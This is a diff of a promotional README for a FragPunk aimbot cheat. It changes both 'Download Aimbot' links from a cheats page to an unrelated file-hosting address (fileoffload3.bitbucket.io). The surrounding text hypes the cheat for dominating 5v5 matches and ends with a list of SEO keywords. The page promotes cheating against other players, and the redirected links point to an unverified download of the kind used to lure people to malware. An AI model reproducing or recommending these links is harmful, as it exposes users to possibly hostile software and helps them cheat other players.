@@ -4,7 +4,7 @@
 
 Perfect for both rage setups and lowkey "legit" configs, it gives you total aim dominance in FragPunk’s fast-paced 5v5 chaos.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/fragpunk/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🎮 What Is a FragPunk Aimbot?
@@ -13,7 +13,7 @@ A **FragPunk Aimbot** is an advanced cheat that auto-adjusts your crosshair to s
 
 Whether you're holding angles or entry fragging, this cheat turns you into a head-clicking machine.
 
-[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.imgur.com%2Fnp8o68C.png&hash=0067a04ef80bb69476279ded1e4c0ee4)](https://wecheaters.github.io/cheats/fragpunk/)
+[![Download Aimbot](https://yougame.biz/proxy.php?image=https%3A%2F%2Fi.imgur.com%2Fnp8o68C.png&hash=0067a04ef80bb69476279ded1e4c0ee4)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🔥 Top Features of FragPunk Aimbot
@@ -97,3 +97,4 @@ fragpunk aimbot, aim assist fragpunk, headshot cheat fps, fragpunk smooth aimbot
 
 **Why miss when you can laser?**
 With a **FragPunk Aimbot**, you don't aim to improve — you aim to *win every single round*. 🎯🧠🔥
+
